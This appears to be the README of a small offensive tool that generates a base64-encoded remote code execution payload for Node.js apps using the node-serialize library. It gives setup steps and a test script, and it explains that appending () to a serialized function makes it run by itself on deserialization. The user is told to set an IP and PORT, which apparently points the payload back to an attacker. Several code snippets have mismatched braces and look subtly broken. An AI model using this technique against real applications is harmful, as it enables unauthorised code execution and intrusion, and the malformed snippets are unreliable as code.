# Nodejs_RCE

## Description

A quick make for a node.js rce base64 encoded value

## Usage

Read the script and edit the IP, PORT (maybe payload, escape the double quotes!!)

## More info on the RCE (Serailize test)

Setup environment!

```bash
sudo apt-get install node
sudo apt-get install npm
npm install node-serialize
```

test.js file

```
var y = {
 "email": function(){ return "hello"; })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```

We auto execute the code adding () at the end 

```
var y = { "email": function(){ return "hello"; })}()}
```
